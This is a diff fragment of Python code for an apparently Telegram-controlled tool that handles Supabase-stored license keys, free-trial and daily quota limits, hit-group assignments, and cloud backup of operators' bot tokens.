+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _license_registry_lock:
+        payload = {
+            "key": LICENSE_REGISTRY_KEY,
+            "value": registry,
+            "updated_at": license_iso_now(),
+        }
+        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
+        try:
+            r = requests.post(
+                url,
+                headers=supabase_headers("resolution=merge-duplicates"),
+                json=payload,
+                timeout=CLOUD_TIMEOUT,
+            )
+            if not r.ok:
+                return r.text[:200]
+        except Exception as exc:
+            return str(exc)[:120]
+    license_invalidate_cache()
+    return None
+
+
+_user_hit_group_cache = {"registry": None, "at": 0.0}
+_user_hit_group_lock = threading.RLock()
+USER_HIT_GROUP_CACHE_TTL = 30
+
+_operator_links_cache = {"registry": None, "at": 0.0}
+_operator_links_lock = threading.RLock()
+OPERATOR_LINKS_CACHE_TTL = 30
+
+
+def user_hit_group_default_registry():
+    return {"users": {}}
+
+
+def user_hit_group_normalize_registry(raw):
+    if not isinstance(raw, dict):
+        return user_hit_group_default_registry()
+    users = raw.get("users")
+    if not isinstance(users, dict):
+        users = raw
+    clean = {}
+    for uid, val in (users or {}).items():
+        uid = str(uid).strip()
+        if not uid:
+            continue
+        if isinstance(val, dict):
+            gid = str(val.get("hit_group_id") or val.get("group_id") or "").strip()
+        else:
+            gid = str(val or "").strip()
+        if gid:
+            clean[uid] = gid
+    return {"users": clean}
+
+
+def user_hit_group_invalidate_cache():
+    with _user_hit_group_lock:
+        _user_hit_group_cache["registry"] = None
+        _user_hit_group_cache["at"] = 0.0
+
+
+def user_hit_group_fetch_registry(*, force=False):
+    now = time.time()
+    with _user_hit_group_lock:
+        if (
+            not force
+            and _user_hit_group_cache["registry"] is not None
+            and now - _user_hit_group_cache["at"] < USER_HIT_GROUP_CACHE_TTL
+        ):
+            return json.loads(json.dumps(_user_hit_group_cache["registry"])), None
+        if not is_cloud_enabled():
+            return user_hit_group_default_registry(), "Cloud offline"
+        data, err = supabase_request(
+            "GET",
+            "app_settings",
+            params={
+                "key": f"eq.{USER_HIT_GROUP_REGISTRY_KEY}",
+                "select": "value",
+                "limit": "1",
+            },
+        )
+        if err:
+            return user_hit_group_default_registry(), err
+        reg = user_hit_group_default_registry()
+        if data:
+            val = data[0].get("value")
+            if isinstance(val, str):
+                try:
+                    val = json.loads(val)
+                except json.JSONDecodeError:
+                    val = {}
+            reg = user_hit_group_normalize_registry(val or {})
+        _user_hit_group_cache["registry"] = reg
+        _user_hit_group_cache["at"] = now
+        return json.loads(json.dumps(reg)), None
+
+
+def user_hit_group_save_registry(registry):
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _user_hit_group_lock:
+        payload = {
+            "key": USER_HIT_GROUP_REGISTRY_KEY,
+            "value": user_hit_group_normalize_registry(registry or {}),
+            "updated_at": license_iso_now(),
+        }
+        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
+        try:
+            r = requests.post(
+                url,
+                headers=supabase_headers("resolution=merge-duplicates"),
+                json=payload,
+                timeout=CLOUD_TIMEOUT,
+            )
+            if not r.ok:
+                return r.text[:200]
+        except Exception as exc:
+            return str(exc)[:120]
+    user_hit_group_invalidate_cache()
+    return None
+
+
+def user_hit_group_get(chat_id):
+    chat_id = str(chat_id or "").strip()
+    if not chat_id:
+        return None
+    reg, _ = user_hit_group_fetch_registry()
+    gid = str(reg.get("users", {}).get(chat_id) or "").strip()
+    return gid or None
+
+
+def user_hit_group_set(chat_id, group_id):
+    chat_id = str(chat_id or "").strip()
+    gid = str(group_id or "").strip()
+    if not chat_id or not gid:
+        return "Missing user or group"
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _user_hit_group_lock:
+        reg, err = user_hit_group_fetch_registry(force=True)
+        if err:
+            return err
+        reg.setdefault("users", {})[chat_id] = gid
+        return user_hit_group_save_registry(reg)
+
+
+def user_hit_group_clear(chat_id):
+    chat_id = str(chat_id or "").strip()
+    if not chat_id or not is_cloud_enabled():
+        return None
+    with _user_hit_group_lock:
+        reg, err = user_hit_group_fetch_registry(force=True)
+        if err:
+            return err
+        users = reg.get("users") or {}
+        if chat_id not in users:
+            return None
+        users.pop(chat_id, None)
+        reg["users"] = users
+        return user_hit_group_save_registry(reg)
+
+
+def operator_links_default_registry():
+    return {"users": {}}
+
+
+def operator_links_normalize_registry(raw):
+    if not isinstance(raw, dict):
+        return operator_links_default_registry()
+    users = raw.get("users")
+    if not isinstance(users, dict):
+        users = raw
+    clean = {}
+    for uid, val in (users or {}).items():
+        uid = str(uid).strip()
+        if not uid:
+            continue
+        if isinstance(val, dict):
+            tok = (val.get("bot_token") or val.get("telegram_bot_token") or "").strip()
+            name = (val.get("display_name") or "").strip()
+            at = (val.get("updated_at") or "").strip()
+        else:
+            tok = str(val or "").strip()
+            name = ""
+            at = ""
+        if tok:
+            clean[uid] = {"bot_token": tok, "display_name": name[:64], "updated_at": at}
+    return {"users": clean}
+
+
+def operator_links_invalidate_cache():
+    with _operator_links_lock:
+        _operator_links_cache["registry"] = None
+        _operator_links_cache["at"] = 0.0
+
+
+def operator_links_fetch_registry(*, force=False):
+    now = time.time()
+    with _operator_links_lock:
+        if (
+            not force
+            and _operator_links_cache["registry"] is not None
+            and now - _operator_links_cache["at"] < OPERATOR_LINKS_CACHE_TTL
+        ):
+            return json.loads(json.dumps(_operator_links_cache["registry"])), None
+        if not is_cloud_enabled():
+            return operator_links_default_registry(), "Cloud offline"
+        data, err = supabase_request(
+            "GET",
+            "app_settings",
+            params={
+                "key": f"eq.{OPERATOR_LINKS_REGISTRY_KEY}",
+                "select": "value",
+                "limit": "1",
+            },
+        )
+        if err:
+            return operator_links_default_registry(), err
+        reg = operator_links_default_registry()
+        if data:
+            val = data[0].get("value")
+            if isinstance(val, str):
+                try:
+                    val = json.loads(val)
+                except json.JSONDecodeError:
+                    val = {}
+            reg = operator_links_normalize_registry(val or {})
+        _operator_links_cache["registry"] = reg
+        _operator_links_cache["at"] = now
+        return json.loads(json.dumps(reg)), None
+
+
+def operator_links_save_registry(registry):
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _operator_links_lock:
+        payload = {
+            "key": OPERATOR_LINKS_REGISTRY_KEY,
+            "value": operator_links_normalize_registry(registry or {}),
+            "updated_at": license_iso_now(),
+        }
+        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
+        try:
+            r = requests.post(
+                url,
+                headers=supabase_headers("resolution=merge-duplicates"),
+                json=payload,
+                timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
+            )
+            if not r.ok:
+                return r.text[:200]
+        except Exception as exc:
+            return str(exc)[:120]
+    operator_links_invalidate_cache()
+    return None
+
+
+def operator_link_set(chat_id, bot_token, display_name=""):
+    chat_id = str(chat_id or "").strip()
+    bot_token = (bot_token or "").strip()
+    if not chat_id or not bot_token:
+        return "Missing chat/token"
+    if not is_cloud_enabled():
+        return "Cloud offline"
+    with _operator_links_lock:
+        reg, err = operator_links_fetch_registry(force=True)
+        if err:
+            return err
+        reg.setdefault("users", {})[chat_id] = {
+            "bot_token": bot_token,
+            "display_name": (display_name or "")[:64],
+            "updated_at": license_iso_now(),
+        }
+        return operator_links_save_registry(reg)
+
+
+def operator_link_get(chat_id):
+    """Pull saved bot token for this Telegram id from cloud registry."""
+    chat_id = str(chat_id or "").strip()
+    if not chat_id or not is_cloud_enabled():
+        return None
+    reg, err = operator_links_fetch_registry(force=False)
+    if err:
+        return None
+    info = (reg.get("users") or {}).get(chat_id)
+    if not isinstance(info, dict):
+        return None
+    token = (info.get("bot_token") or "").strip()
+    if not token:
+        return None
+    return {
+        "telegram_chat_id": chat_id,
+        "telegram_bot_token": token,
+        "display_name": (info.get("display_name") or "")[:64] or f"User {chat_id[-6:]}",
+    }
+
+
+def restore_operator_session_from_cloud(chat_id=None):
+    """Re-link bot token from cloud when local files are missing or corrupt."""
+    chat_id = str(chat_id or _read_stored_chat_id() or "").strip()
+    if not chat_id or is_locally_logged_out():
+        return False
+    record = operator_link_get(chat_id)
+    if not record:
+        return False
+    clear_local_logged_out()
+    apply_telegram_credentials(record["telegram_bot_token"], record["telegram_chat_id"])
+    restore_operator_hit_group_for_user(chat_id)
+    return True
+
+
+def license_parse_duration_days(token):
+    raw = (token or "").strip().lower()
+    if not raw:
+        return 30
+    if raw.endswith("h"):
+        hours = max(1, int(raw[:-1]))
+        return max(1, round(hours / 24))
+    if raw.endswith("d"):
+        return max(1, min(LICENSE_MAX_DAYS, int(raw[:-1])))
+    if raw.endswith("m") and not raw.endswith("min"):
+        months = max(1, int(raw[:-1]))
+        return max(1, min(LICENSE_MAX_DAYS, months * 30))
+    if raw.isdigit():
+        return max(1, min(LICENSE_MAX_DAYS, int(raw)))
+    return 30
+
+
+def license_normalize_key(key):
+    key = (key or "").strip().upper().replace(" ", "")
+    key = key.replace("_", "-")
+    if not key.startswith(LICENSE_KEY_PREFIX):
+        if len(key.replace("-", "")) == 16:
+            key = f"{LICENSE_KEY_PREFIX}-{key[0:4]}-{key[4:8]}-{key[8:12]}-{key[12:16]}"
+    return key
+
+
+def license_generate_key(days, by_admin=""):
+    days = max(1, min(LICENSE_MAX_DAYS, int(days)))
+    with _license_registry_lock:
+        reg, err = license_fetch_registry(force=True)
+        if err and "offline" in str(err).lower():
+            return None, err
+        token = secrets.token_hex(8).upper()
+        key = f"{LICENSE_KEY_PREFIX}-{token[0:4]}-{token[4:8]}-{token[8:12]}-{token[12:16]}"
+        reg.setdefault("keys", {})[key] = {
+            "days": days,
+            "created_at": license_iso_now(),
+            "created_by": str(by_admin or ""),
+            "redeemed_by": None,
+            "redeemed_at": None,
+        }
+        save_err = license_save_registry(reg)
+        if save_err:
+            return None, save_err
+    return key, None
+
+
+def license_grant_user(user_id, days, *, by_admin="", source="manual", note="", key_ref=""):
+    user_id = str(user_id).strip()
+    if not user_id or not user_id.isdigit():
+        return False, "Invalid Telegram user id"
+    days = max(1, min(LICENSE_MAX_DAYS, int(days)))
+    with _license_registry_lock:
+        reg, err = license_fetch_registry(force=True)
+        if err and "offline" in str(err).lower():
+            return False, err
+        now = datetime.now(timezone.utc)
+        lic = reg.setdefault("licenses", {}).get(user_id) or {}
+        base = now
+        existing_exp = license_parse_iso(lic.get("expires_at"))
+        if existing_exp and existing_exp > now:
+            base = existing_exp
+        new_exp = base + timedelta(days=days)
+        reg["licenses"][user_id] = {
+            "expires_at": new_exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "granted_at": license_iso_now(),
+            "granted_by": str(by_admin or ""),
+            "source": source,
+            "note": (note or "")[:120],
+            "key_ref": key_ref or "",
+        }
+        save_err = license_save_registry(reg)
+        if save_err:
+            return False, save_err
+    persist_local_license(user_id, reg["licenses"][user_id]["expires_at"])
+    license_invalidate_cache()
+    admin_invalidate_access(user_id)
+    invalidate_operator_gate_cache()
+    return True, new_exp
+
+
+def license_revoke_user(user_id):
+    user_id = str(user_id).strip()
+    with _license_registry_lock:
+        reg, _ = license_fetch_registry(force=True)
+        reg.setdefault("licenses", {}).pop(user_id, None)
+        save_err = license_save_registry(reg)
+    if user_id == resolve_operator_telegram_id():
+        clear_local_license()
+    license_invalidate_cache()
+    admin_invalidate_access(user_id)
+    invalidate_operator_gate_cache()
+    return save_err
+
+
+def license_redeem_key(key, user_id):
+    """Atomic redeem — grant + mark key in one cloud save (never wipe licenses)."""
+    user_id = str(user_id).strip()
+    key = license_normalize_key(key)
+    with _license_registry_lock:
+        reg, err = license_fetch_registry(force=True)
+        if err and "offline" in str(err).lower():
+            return False, "Cloud offline — try again"
+        entry = reg.get("keys", {}).get(key)
+        if not entry:
+            return False, "Invalid or expired key"
+        if entry.get("redeemed_by"):
+            return False, "Key already redeemed"
+        days = int(entry.get("days") or 30)
+        now = datetime.now(timezone.utc)
+        lic = reg.setdefault("licenses", {}).get(user_id)
+        base = now
+        if isinstance(lic, dict):
+            existing_exp = license_parse_iso(lic.get("expires_at"))
+            if existing_exp and existing_exp > now:
+                base = existing_exp
+        new_exp = base + timedelta(days=days)
+        reg["licenses"][user_id] = {
+            "expires_at": new_exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "granted_at": license_iso_now(),
+            "granted_by": str(entry.get("created_by") or ""),
+            "source": "key",
+            "note": "",
+            "key_ref": key,
+        }
+        entry = dict(entry)
+        entry["redeemed_by"] = user_id
+        entry["redeemed_at"] = license_iso_now()
+        reg.setdefault("keys", {})[key] = entry
+        save_err = license_save_registry(reg)
+        if save_err:
+            return False, save_err
+    persist_local_license(user_id, reg["licenses"][user_id]["expires_at"])
+    license_invalidate_cache()
+    admin_invalidate_access(user_id)
+    invalidate_operator_gate_cache()
+    return True, new_exp
+
+
+def refresh_terminal_license_from_cloud():
+    """Pull cloud license into .inpareto_license for this operator (Enter refresh)."""
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return
+    admin_load_settings(force=False)
+    license_invalidate_cache()
+    paid_ok, _, exp = paid_access_status(user_id)
+    if paid_ok and exp:
+        persist_local_license(user_id, exp.strftime("%Y-%m-%dT%H:%M:%SZ"))
+
+
+def ensure_boot_access_context():
+    """Sync admin list, license, hit group from cloud (Telegram id only)."""
+    if not TELEGRAM_ENABLED or not is_cloud_enabled():
+        return
+    if is_locally_logged_out() or not has_local_operator_session():
+        return
+    try:
+        admin_load_settings(force=True)
+        refresh_terminal_license_from_cloud()
+        uid = resolve_operator_telegram_id()
+        if uid and not plan_is_premium(uid):
+            operator_plan_entitled(uid)
+        sync_local_hit_group_from_cloud()
+        reconcile_operator_hit_group()
+    except Exception as exc:
+        log_event("BOOT CTX", str(exc)[:80])
+
+
+def _spawn_boot_access_refresh():
+    """Pull cloud license/settings without blocking the boot menu."""
+    if not TELEGRAM_ENABLED or not is_cloud_enabled():
+        return
+    if is_locally_logged_out() or not has_local_operator_session():
+        return
+
+    def _run():
+        try:
+            ensure_boot_access_context()
+        except Exception as exc:
+            log_event("BOOT CTX", str(exc)[:80])
+
+    threading.Thread(target=_run, daemon=True, name="boot-ctx").start()
+
+
+def _load_local_session_record():
+    """Build a device-like dict from local hidden files (primary login source)."""
+    chat_id = _read_stored_chat_id()
+    token = _read_stored_bot_token()
+    if not chat_id or not token:
+        return None
+    return {
+        "telegram_chat_id": chat_id,
+        "telegram_bot_token": token,
+        "display_name": f"User {chat_id[-6:]}",
+    }
+
+
+def _boot_linked_from_local():
+    """Start Telegram from local .inpareto_* files, or cloud operator_links backup."""
+    record = _load_local_session_record()
+    if not record:
+        chat_id = _read_stored_chat_id()
+        if chat_id and restore_operator_session_from_cloud(chat_id):
+            record = _load_local_session_record()
+    if not record:
+        return False
+    apply_telegram_credentials(record["telegram_bot_token"], record["telegram_chat_id"])
+    local_gid = read_local_hit_group_id()
+    if local_gid:
+        global _cached_hit_group_id
+        _cached_hit_group_id = local_gid
+    for line in paint_action_box(
+        "BOOT",
+        [
+            ("Session restored — bot is live (local or cloud backup).", ANSI_GREEN),
+            ("Finish plan setup / hit group on the next screen if needed.", ANSI_DIM),
+        ],
+        ANSI_CYAN,
+    ):
+        print(line)
+    print()
+    sys.stdout.flush()
+    start_telegram_monitor()
+    threading.Thread(
+        target=_defer_linked_device_sync,
+        args=(record,),
+        daemon=True,
+        name="boot-device-sync",
+    ).start()
+    return True
+
+
+def paid_access_status(user_id):
+    """(ok, reason, expires_dt) — keyed by Telegram user id."""
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return False, "no_license", None
+    if admin_is_admin(user_id):
+        return True, None, None
+    now = datetime.now(timezone.utc)
+    local = read_local_license()
+    if local and str(local.get("user_id")) == user_id:
+        exp = license_parse_iso(local.get("expires_at"))
+        if exp and exp > now:
+            return True, None, exp
+    if not is_cloud_enabled():
+        if local and str(local.get("user_id")) == user_id:
+            exp = license_parse_iso(local.get("expires_at"))
+            if exp and exp > now:
+                return True, None, exp
+        with _paid_access_lock:
+            reg = _paid_access_cache.get("registry")
+            reg_at = float(_paid_access_cache.get("at") or 0)
+        if (
+            isinstance(reg, dict)
+            and time.time() - reg_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
+        ):
+            row = (reg.get("licenses") or {}).get(user_id)
+            if isinstance(row, dict):
+                exp = license_parse_iso(row.get("expires_at"))
+                if exp and exp > now:
+                    return True, None, exp
+        return False, "cloud_offline", None
+    reg, err = license_fetch_registry()
+    if err:
+        if local and str(local.get("user_id")) == user_id:
+            exp = license_parse_iso(local.get("expires_at"))
+            if exp and exp > now:
+                return True, None, exp
+        with _paid_access_lock:
+            reg = _paid_access_cache.get("registry")
+            reg_at = float(_paid_access_cache.get("at") or 0)
+        if (
+            isinstance(reg, dict)
+            and time.time() - reg_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
+        ):
+            row = (reg.get("licenses") or {}).get(user_id)
+            if isinstance(row, dict):
+                exp = license_parse_iso(row.get("expires_at"))
+            if exp and exp > now:
+                return True, None, exp
+        return False, "cloud_offline", None
+    row = reg.get("licenses", {}).get(user_id)
+    if not row:
+        return False, "no_license", None
+    exp = license_parse_iso(row.get("expires_at"))
+    if not exp or exp <= now:
+        with _paid_access_lock:
+            fresh = time.time() - float(_paid_access_cache.get("at") or 0) < LICENSE_CACHE_TTL
+        if fresh and user_id == resolve_operator_telegram_id():
+            clear_local_license()
+        return False, "expired", exp
+    if user_id == resolve_operator_telegram_id():
+        persist_local_license(user_id, row.get("expires_at"))
+    return True, None, exp
+
+
+def plan_utc_day():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%d")
+
+
+def plan_fetch_enforcement_registry():
+    """Cloud registry for quota enforcement — stale cache allowed briefly when offline."""
+    if not is_cloud_enabled():
+        return False, None, "Cloud offline"
+    reg, err = license_fetch_registry(force=False)
+    if not err:
+        return True, reg, None
+    now = time.time()
+    with _paid_access_lock:
+        cached = _paid_access_cache.get("registry")
+        cached_at = float(_paid_access_cache.get("at") or 0)
+        if (
+            cached is not None
+            and now - cached_at < PLAN_CLOUD_OFFLINE_GRACE_SEC
+        ):
+            return True, json.loads(json.dumps(cached)), "cache"
+    return False, None, err or "Cloud offline"
+
+
+def plan_is_premium(user_id):
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return False
+    if admin_is_admin(user_id):
+        return True
+    ok, _, _ = paid_access_status(user_id)
+    return bool(ok)
+
+
+def plan_merge_free_row(cloud_row, local_row, *, online=False):
+    """Cloud is source of truth when online — local file is encrypted cache only."""
+    if online and isinstance(cloud_row, dict) and cloud_row.get("trial_ends_at"):
+        return dict(cloud_row)
+    if isinstance(cloud_row, dict):
+        row = dict(cloud_row)
+    elif isinstance(local_row, dict):
+        row = {k: v for k, v in local_row.items() if k != "user_id"}
+    else:
+        return {}
+    if (
+        not online
+        and isinstance(cloud_row, dict)
+        and isinstance(local_row, dict)
+    ):
+        today = plan_utc_day()
+        cloud_day = str(cloud_row.get("last_day") or "")
+        local_day = str(local_row.get("last_day") or "")
+        if cloud_day == today and local_day == today:
+            row["day_count"] = max(
+                int(cloud_row.get("day_count") or 0),
+                int(local_row.get("day_count") or 0),
+            )
+            row["last_day"] = today
+    return row
+
+
+def plan_fetch_free_row(user_id, registry=None, *, online=None):
+    user_id = str(user_id or "").strip()
+    local_row = read_local_free_plan()
+    if local_row and str(local_row.get("user_id")) != user_id:
+        local_row = None
+    cloud_row = None
+    if isinstance(registry, dict):
+        cloud_row = (registry.get("free") or {}).get(user_id)
+    if online is None:
+        online = is_cloud_enabled() and isinstance(registry, dict)
+    return plan_merge_free_row(cloud_row, local_row, online=online)
+
+
+def plan_free_trial_expired(row):
+    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
+    if not trial_end:
+        return False
+    return trial_end <= datetime.now(timezone.utc)
+
+
+def plan_new_free_row():
+    now = datetime.now(timezone.utc)
+    trial_end = now + timedelta(days=FREE_TRIAL_DAYS)
+    return {
+        "started_at": license_iso_now(),
+        "trial_ends_at": trial_end.strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "last_day": plan_utc_day(),
+        "day_count": 0,
+    }
+
+
+def plan_save_free_row(user_id, row, registry=None):
+    user_id = str(user_id or "").strip()
+    if not user_id or not isinstance(row, dict):
+        return "invalid free plan row"
+    persist_local_free_plan(user_id, row)
+    if not is_cloud_enabled():
+        return None
+    with _license_registry_lock:
+        reg = registry
+        if reg is None:
+            reg, err = license_fetch_registry(force=True)
+            if err and "offline" not in str(err).lower():
+                return err
+            if err:
+                return None
+        reg.setdefault("free", {})[user_id] = dict(row)
+        return license_save_registry(reg)
+
+
+def plan_ensure_free_trial(user_id, registry=None, *, persist=True, online=False):
+    user_id = str(user_id or "").strip()
+    if not user_id or plan_is_premium(user_id):
+        return plan_fetch_free_row(user_id, registry, online=online), None, False
+    row = plan_fetch_free_row(user_id, registry, online=online)
+    created = False
+    if row.get("trial_ends_at") and plan_free_trial_expired(row):
+        return row, None, False
+    if not isinstance(row, dict) or not row.get("trial_ends_at"):
+        if not persist or registry is None:
+            return row or {}, None, False
+        row = plan_new_free_row()
+        created = True
+        save_err = plan_save_free_row(user_id, row, registry)
+        if save_err:
+            return row, save_err, created
+    elif persist and registry is not None:
+        cloud_row = (registry.get("free") or {}).get(user_id)
+        if not cloud_row:
+            save_err = plan_save_free_row(user_id, row, registry)
+            if save_err:
+                return row, save_err, created
+    return row, None, created
+
+
+def plan_free_day_count(row):
+    row = row if isinstance(row, dict) else {}
+    today = plan_utc_day()
+    if str(row.get("last_day") or "") != today:
+        return 0, today
+    return int(row.get("day_count") or 0), today
+
+
+def plan_build_snapshot(user_id, row=None, *, registry=None):
+    user_id = str(user_id or "").strip()
+    now = datetime.now(timezone.utc)
+    if plan_is_premium(user_id):
+        ok, reason, exp = paid_access_status(user_id)
+        remaining = max(0, int(((exp - now).total_seconds() if exp else 0) // 86400))
+        return {
+            "plan": PLAN_PREMIUM,
+            "tier": "admin" if admin_is_admin(user_id) else PLAN_PREMIUM,
+            "active": bool(ok),
+            "reason": reason,
+            "expires_at": exp,
+            "days_left": remaining,
+            "limit": None,
+            "day_count": None,
+            "trial_ends_at": None,
+            "trial_expired": False,
+        }
+    if row is None:
+        reg_ok, reg, _ = plan_fetch_enforcement_registry()
+        if reg_ok:
+            row, _, _ = plan_ensure_free_trial(
+                user_id, reg, persist=False, online=True,
+            )
+        else:
+            row = plan_fetch_free_row(user_id, online=False)
+    day_count, today = plan_free_day_count(row)
+    trial_end = license_parse_iso((row or {}).get("trial_ends_at"))
+    trial_active = bool(trial_end and trial_end > now)
+    remaining_trial = max(0, int(((trial_end - now).total_seconds() if trial_end else 0) // 86400))
+    if trial_end and trial_end <= now:
+        remaining_trial = 0
+    pct = min(100.0, 100.0 * day_count / max(1, FREE_DAILY_GEN_LIMIT))
+    return {
+        "plan": PLAN_FREE,
+        "tier": PLAN_FREE,
+        "active": trial_active,
+        "reason": None if trial_active else "trial_expired",
+        "expires_at": trial_end,
+        "days_left": remaining_trial,
+        "limit": FREE_DAILY_GEN_LIMIT,
+        "day_count": day_count,
+        "last_day": today,
+        "trial_ends_at": trial_end,
+        "trial_expired": not trial_active,
+        "usage_pct": pct,
+        "remaining_today": max(0, FREE_DAILY_GEN_LIMIT - day_count),
+    }
+
+
+def operator_plan_entitled(user_id):
+    """Bot/terminal access — active free trial or premium (daily cap does not block)."""
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return False, "no_user", {}
+    if admin_is_admin(user_id):
+        return True, None, plan_build_snapshot(user_id)
+    if plan_is_premium(user_id):
+        snap = plan_build_snapshot(user_id)
+        if snap.get("active"):
+            return True, None, snap
+        return False, snap.get("reason") or "expired", snap
+    with _license_registry_lock:
+        reg_ok, reg, src = plan_fetch_enforcement_registry()
+        if not reg_ok:
+            if read_operator_session_verified(user_id) and _dashboard_local_premium_snap(user_id):
+                return True, None, _dashboard_local_premium_snap(user_id)
+            if read_operator_session_verified(user_id):
+                row = plan_fetch_free_row(user_id, online=False)
+                if row and not plan_free_trial_expired(row):
+                    return True, None, plan_build_snapshot(user_id, row)
+            return False, "cloud_offline", {"plan": PLAN_FREE}
+        online = src != "cache"
+        row, save_err, _ = plan_ensure_free_trial(
+            user_id, reg, persist=True, online=online,
+        )
+        if save_err and "offline" not in str(save_err).lower():
+            log_event("PLAN", f"free tier sync: {str(save_err)[:60]}")
+        snap = plan_build_snapshot(user_id, row, registry=reg)
+        if snap.get("trial_expired"):
+            return False, "trial_expired", snap
+        if src == "cache":
+            snap["local_fallback"] = True
+        return True, None, snap
+
+
+def plan_can_hunt(user_id=None):
+    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
+    if not user_id:
+        return False, "no_user", {}
+    entitled, reason, info = operator_plan_entitled(user_id)
+    if not entitled:
+        return False, reason or "no_access", info
+    if info.get("plan") == PLAN_PREMIUM:
+        return True, None, info
+    day_count = int(info.get("day_count") or 0)
+    limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+    if day_count >= limit:
+        info = dict(info)
+        info["remaining_today"] = 0
+        return False, "daily_limit", info
+    return True, None, info
+
+
+def _plan_flush_acquire_cloud_cache():
+    """Push batched free-plan increments to cloud (best-effort)."""
+    cache = _plan_acquire_cache
+    pending = int(cache.get("cloud_pending") or 0)
+    reg = cache.get("reg")
+    if pending <= 0 or not is_cloud_enabled() or not isinstance(reg, dict):
+        cache["cloud_pending"] = 0
+        return None
+    err = license_save_registry(reg)
+    cache["cloud_pending"] = 0
+    return err
+
+
+def plan_acquire_generation(user_id=None, count=1):
+    """Atomically enforce quota and increment (cloud authoritative). Call before hunt HTTP."""
+    global _plan_limit_warn_level, _plan_limit_warn_day, _plan_acquire_cache
+    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
+    count = max(1, int(count or 1))
+    if not user_id:
+        return False, "no_user", {}
+    if plan_is_premium(user_id) or admin_is_admin(user_id):
+        return True, None, plan_build_snapshot(user_id)
+    today = plan_utc_day()
+    if _plan_limit_warn_day != today:
+        _plan_limit_warn_day = today
+        _plan_limit_warn_level = 0
+    with _license_registry_lock:
+        cache = _plan_acquire_cache
+        now = time.time()
+        reload = (
+            cache.get("user_id") != user_id
+            or cache.get("row") is None
+            or cache.get("reg") is None
+            or now - float(cache.get("loaded_at") or 0) >= PLAN_REGISTRY_RELOAD_SEC
+        )
+        if reload:
+            if cache.get("user_id") and int(cache.get("cloud_pending") or 0) > 0:
+                _plan_flush_acquire_cloud_cache()
+        reg_ok, reg, src = plan_fetch_enforcement_registry()
+        row = None
+        if reg_ok:
+            online = src != "cache"
+            row, save_err, _ = plan_ensure_free_trial(
+                user_id, reg, persist=True, online=online,
+            )
+            if save_err and "offline" not in str(save_err).lower():
+                return False, "cloud_offline", {"plan": PLAN_FREE}
+        elif read_operator_session_verified(user_id):
+            row = plan_fetch_free_row(user_id, online=False)
+            if row and not plan_free_trial_expired(row):
+                reg = {"free": {user_id: dict(row)}}
+            else:
+                row = None
+        if not isinstance(reg, dict) or not row:
+            return False, "cloud_offline", {"plan": PLAN_FREE}
+        cache.update(
+            user_id=user_id,
+            row=dict(row),
+            reg=reg,
+            loaded_at=now,
+            cloud_pending=int(cache.get("cloud_pending") or 0),
+        )
+        if plan_free_trial_expired(row):
+            snap = plan_build_snapshot(user_id, row, registry=reg)
+            return False, "trial_expired", snap
+        day_count, _ = plan_free_day_count(row)
+        limit = FREE_DAILY_GEN_LIMIT
+        if day_count + count > limit:
+            snap = plan_build_snapshot(user_id, row, registry=reg)
+            snap["remaining_today"] = 0
+            plan_handle_daily_limit_hit()
+            return False, "daily_limit", snap
+        row = dict(row)
+        row["last_day"] = today
+        row["day_count"] = day_count + count
+        persist_local_free_plan(user_id, row)
+        if isinstance(reg, dict):
+            reg.setdefault("free", {})[user_id] = dict(row)
+        cache["row"] = dict(row)
+        cache["cloud_pending"] = int(cache.get("cloud_pending") or 0) + 1
+        if reload or cache["cloud_pending"] >= PLAN_CLOUD_BATCH_EVERY:
+            save_err = _plan_flush_acquire_cloud_cache()
+        if save_err and "offline" not in str(save_err).lower():
+                log_event("PLAN", f"cloud sync deferred: {str(save_err)[:60]}")
+        used = int(row["day_count"])
+        for idx, threshold in enumerate(FREE_PLAN_WARN_PCT):
+            level = idx + 1
+            if used / limit >= threshold and _plan_limit_warn_level < level:
+                _plan_limit_warn_level = level
+                log_event(
+                    "PLAN",
+                    f"Free quota {int(threshold * 100)}% — {used:,}/{limit:,} generated today",
+                )
+        snap = plan_build_snapshot(user_id, row, registry=reg)
+        if used >= limit:
+            _plan_flush_acquire_cloud_cache()
+            plan_handle_daily_limit_hit()
+        return True, None, snap
+
+
+def plan_record_generated(user_id=None, count=1):
+    """Deprecated path — quota is reserved in plan_acquire_generation before hunt."""
+    return plan_acquire_generation(user_id, count)
+
+
+def plan_release_generation(user_id=None, count=1):
+    """Rollback optimistic quota when hunt aborts before a username is consumed."""
+    global _plan_acquire_cache
+    user_id = str(user_id or resolve_operator_telegram_id() or "").strip()
+    count = max(1, int(count or 1))
+    if not user_id or plan_is_premium(user_id) or admin_is_admin(user_id):
+        return
+    with _license_registry_lock:
+        cache = _plan_acquire_cache
+        if (
+            cache.get("user_id") == user_id
+            and isinstance(cache.get("row"), dict)
+            and isinstance(cache.get("reg"), dict)
+        ):
+            reg = cache["reg"]
+            row = dict(cache["row"])
+        else:
+            reg_ok, reg, src = plan_fetch_enforcement_registry()
+            if not reg_ok:
+                return
+            row, _, _ = plan_ensure_free_trial(
+                user_id, reg, persist=False, online=src != "cache",
+            )
+            row = dict(row) if isinstance(row, dict) else {}
+        day_count, today = plan_free_day_count(row)
+        if str(row.get("last_day") or "") != today or day_count <= 0:
+            return
+        row["day_count"] = max(0, day_count - count)
+        persist_local_free_plan(user_id, row)
+        if isinstance(reg, dict):
